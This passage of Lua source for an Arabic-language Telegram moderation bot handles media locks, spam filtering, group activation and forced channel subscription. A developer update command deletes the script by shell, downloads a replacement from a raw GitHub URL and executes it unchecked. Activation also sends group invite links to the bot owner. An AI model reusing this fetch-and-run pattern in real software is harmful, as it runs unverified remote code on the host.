if msg.content_.ID == 'MessageVoice' and not Special(msg) then     
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not Special(msg) then     
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageSticker' and not Special(msg) then     
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if tonumber(msg.via_bot_user_id_) ~= 0 and not Special(msg) then
if database:get(bot_id.."lock:inline"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Special(msg) then     
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageDocument' and not Special(msg) then     
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Special(msg) then      
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Special(msg) then
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageContact' and not Special(msg) then      
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Special(msg) then  
local _nl, ctrl_ = string.gsub(text, '%c', '')  
local _nl, real_ = string.gsub(text, '%d', '')   
sens = 400  
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if msg.content_.ID == 'MessageSticker' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " ⊀︰ عذرا > {[@"..data.username_.."]}\n ⊀︰ عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, " ⊀︰ عذرا > {["..data.first_name_.."](T.ME/SourcE_RiNdA)}\n ⊀︰ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

------------------------------------------------------------------------

------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⊀︰ عذرا > {[@"..data.username_.."]}\n ⊀︰ عذرا تم منع الصوره \n" ) 
else
send(msg.chat_id_,0," ⊀︰ عذرا > {["..data.first_name_.."](T.ME/SourcE_RiNdA)}\n ⊀︰ عذرا تم منع الصوره \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⊀︰ عذرا > {[@"..data.username_.."]}\n ⊀︰ عذرا تم منع المتحركه \n") 
else
send(msg.chat_id_,0," ⊀︰ عذرا > {["..data.first_name_.."](T.ME/SourcE_RiNdA)}\n ⊀︰ عذرا تم منع المتحركه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

if text == 'تفعيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ عذرا يرجى ترقيه البوت مشرف*')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not Devmode(msg) then
send(msg.chat_id_, msg.id_,' ⊀︰ عدد اعضاء الكروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ⊀︰ متفعل البـوت منزمـان.')
else
sendText(msg.chat_id_,'\n *⊀︰ الـضلـ؏  ↷ * ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n *⊀︰ تم تفعيل الكروب* {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = ' ⊀︰ فعـلو بوتـك بڪࢪوب جديد\n'..
'\n ⊀︰ الفعـله {'..Name..'}'..
'\n ⊀︰ ايـدي ڪࢪوبهم {'..IdChat..'}'..
'\n ⊀︰ اسـم ڪࢪوبهم {['..NameChat..']}'..
'\n ⊀︰ عدد الڪࢪوب *{'..NumMember..'}*'..
'\n ⊀︰ ࢪابط الڪࢪوب {['..LinkGp..']}'
if not Devmode(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end
if text == 'تعطيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'* ⊀︰ بالتأكيد تم تعطيل الكروب*')
else
sendText(msg.chat_id_,'\n *⊀︰ الـضلـ؏  ↷ * ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n *⊀︰ تم تعطيل الكروب* {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '\nتم تعطيل الكروب  ⊀︰ '..
'\n ⊀︰ بواسطة {'..Name..'}'..
'\n ⊀︰ ايدي الكروب {'..IdChat..'}'..
'\n ⊀︰ اسم الكروب {['..NameChat..']}'..
'\n ⊀︰ الرابط {['..LinkGp..']}'
if not Devmode(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end
if text == 'تفعيل' and not Sudo(msg) and not database:get(bot_id..'Free:Bots') then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ عذرا يرجى ترقيه البوت مشرف*')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not Devmode(msg) then
send(msg.chat_id_, msg.id_,' ⊀︰ عدد اعضاء الكروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'مشرف'
end
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تم تفعيل الكروب*')
else
sendText(msg.chat_id_,'\n *⊀︰ الـضلـ؏  ↷ * ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n *⊀︰ تم تفعيل الكروب* {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
database:sadd(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = ' ⊀︰ فـعلو بوتـڪ بڪࢪوب جديد\n'..
'\n ⊀︰ الفعـله {'..Name..'}'..
'\n ⊀︰ ࢪتبته بلڪࢪوب {'..AddPy..'}' ..
'\n ⊀︰ ايدي الڪࢪوب  {'..IdChat..'}'..
'\n ⊀︰ عدد الڪࢪوب *{'..NumMember..'}*'..
'\n ⊀︰ اسم الكروبهـم {['..NameChat..']}'..
'\n ⊀︰ ࢪابط ڪࢪوبهم {['..LinkGp..']}'
if not Devmode(msg) then
sendText(SUDO,Text,0,'md')
end
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end
if text and text:match("^ضع عدد الاعضاء (%d+)$") and Devmode(msg) then
local Num = text:match("ضع عدد الاعضاء (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id..'Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,' ⊀︰ تم تعيين عدد الاعضاء سيتم تفعيل الكروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
if text == 'تحديث ريندا' and Devmode(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
os.execute('rm -rf RiNdA.lua')
os.execute('wget https://raw.githubusercontent.com/RiNdA-SourcE/RiNdA/main/RiNdA.lua')
send(msg.chat_id_, msg.id_,' ⊀︰ تم تحديث سوࢪس ࢪيندا \n ⊀︰ لديك اخر اصدار لسورس ريندا\n ⊀︰ تحديث > { Version> 1 }')
dofile('RiNdA.lua')  
end

if text and text:match("^تغير الاشتراك$") and Devmode(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ⊀︰ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and Devmode(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ⊀︰ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ⊀︰ ." and Devmode(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ⊀︰ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^خلي قناة الاشتراك ⊀︰ .$") and Devmode(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ⊀︰ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ⊀︰ ." and Devmode(msg) then  
if database:get(bot_id..'add:ch:id') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_," ⊀︰ الاشتراك الاجباري مفعل \n ⊀︰ على القناة > ["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_," ⊀︰ اهلا عزيزي المطور \n ⊀︰ ارسل الان معرف قناتك")
end
return false  
end
if text == "تعطيل الاشتراك الاجباري ⊀︰ ." and Devmode(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ⊀︰ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ⊀︰ ." and Devmode(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ⊀︰ تم تفعيل الاشتراك الاجباري \n ⊀︰ على القناة > ["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, " ⊀︰ لا يوجد قناة في الاشتراك الاجباري ")
end
return false  
end
if text == "تفعيل الاضافات" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '⊀︰ تم تفعيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "تعطيل الاضافات" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '⊀︰ تم تعطيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","×")
end
if text == "حاله الاضافات" and Constructor(msg) then
local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
send(msg.chat_id_, msg.id_,"حاله الاضافات هي : {"..MRSoOoFi.."}\nاذا كانت {✔} الاضافات مفعله\nاذا كانت {×} الاضافات معطله")
end
function bnnaGet(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end

if database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
if text and text:match("^كتم اسم (.*)$") and Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local BlNe = text:match("^كتم اسم (.*)$")
send(msg.chat_id_, msg.id_, '⊀︰ تم كتم الاسم '..BlNe)
database:sadd(bot_id.."RiNdA:blocname"..msg.chat_id_, BlNe)
end

if text and text:match("^الغاء كتم اسم (.*)$") and Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local delBn = text:match("^الغاء كتم اسم (.*)$")
send(msg.chat_id_, msg.id_, '⊀︰ تم الغاء كتم الاسم '..delBn)
database:srem(bot_id.."RiNdA:blocname"..msg.chat_id_, delBn)
end

if text == "مسح الاسماء المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
database:del(bot_id.."RiNdA:blocname"..msg.chat_id_)
texts = "⊀︰ تم مسح الاسماء المكتومه "
send(msg.chat_id_, msg.id_, texts)
end
if text == "الاسماء المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local All_name = database:smembers(bot_id.."RiNdA:blocname"..msg.chat_id_)
t = "\n⊀︰ قائمة الاسماء المكتومه \n●━━━━𝐑𝐀━━━━● \n"
for k,v in pairs(All_name) do
t = t..""..k.."- (["..v.."])\n"
end
if #All_name == 0 then
t = "*⊀︰ لا يوجد اسماء مكتومه*"
end
send(msg.chat_id_, msg.id_, t)
end
end
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⊀︰ تم التفعيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
end
if text == "تعطيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⊀︰ تم تعطيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"close")
end
if not Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
function MODE7_name(t1,t2)
if t2.id_ then 
name_MRmode = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRmode then 
names_MRmode = database:smembers(bot_id.."RiNdA:blocname"..msg.chat_id_) or ""
if names_MRmode and names_MRmode[1] then 
for i=1,#names_MRmode do 
if name_MRmode:match("(.*)("..names_MRmode[i]..")(.*)") then 
DeleteMessage_(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
end
end
bnnaGet(msg.sender_user_id_, MODE7_name)
end
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
if text and text:match("^خلي توحيد (.*)$") and Manager(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
local teh = text:match("^خلي توحيد (.*)$")
send(msg.chat_id_, msg.id_,'⊀︰ تم تعيين '..teh..' كتوحيد للمجموعه')
database:set(bot_id.."RiNdA:teh"..msg.chat_id_,teh)
end
if text and text:match("^تعين عدد الكتم (.*)$") and Manager(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
local nump = text:match("^تعين عدد الكتم (.*)$")
send(msg.chat_id_, msg.id_,'⊀︰ تم تعين  '..nump..' عدد الكتم')
database:set(bot_id.."RiNdA:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."RiNdA:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."RiNdA:nump"..msg.chat_id_) or 5
send(msg.chat_id_, msg.id_,'⊀︰ التوحيد '..s1..'\n ⊀︰ عدد الكتم  : '..s2)
end
end
if text == "تفعيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '*⊀︰ تم تفعيل التوحيد*')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
end
if text == "تعطيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '*⊀︰ تم تعطيل التوحيد*')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
end
if not Constructor(msg) then
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."RiNdA:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function mode_mrmode_new(mrmode1,mrmode2)
if mrmode2 and mrmode2.first_name_ then 
if mrmode2.first_name_:match("(.*)"..database:get(bot_id.."RiNdA:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."RiNdA:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrmode_nnn = database:get(bot_id.."RiNdA:nump"..msg.chat_id_) or 5
local mrmode_nnn2 = database:get(bot_id.."RiNdA:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrmode_nnn2) == tonumber(mrmode_nnn) or tonumber(mrmode_nnn2) > tonumber(mrmode_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."RiNdA:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "⊀︰ عزيزي >>["..mrmode2.username_.."](https://t.me/"..(mrmode2.username_ or "SourcE_RiNdA")..")\n⊀︰ عليك خلي التوحيد ⪼ {"..database:get(bot_id.."RiNdA:teh"..msg.chat_id_).."} بجانب اسمك\n⊀︰ عدد المحاولات المتبقيه {"..(tonumber(mrmode_nnn) - tonumber(mrmode_nnn2)).."}")
end
end
end
end
bnnaGet(id, mode_mrmode_new)
end
end
if text == "تفعيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⊀︰ تم تفعيل تنبيه الاسماء')
database:set(bot_id.."Ttn:DRG:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⊀︰ تم تعطيل تنبيه الاسماء')
database:set(bot_id.."Ttn:DRG:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:DRG:stats"..msg.chat_id_) == "open" then 
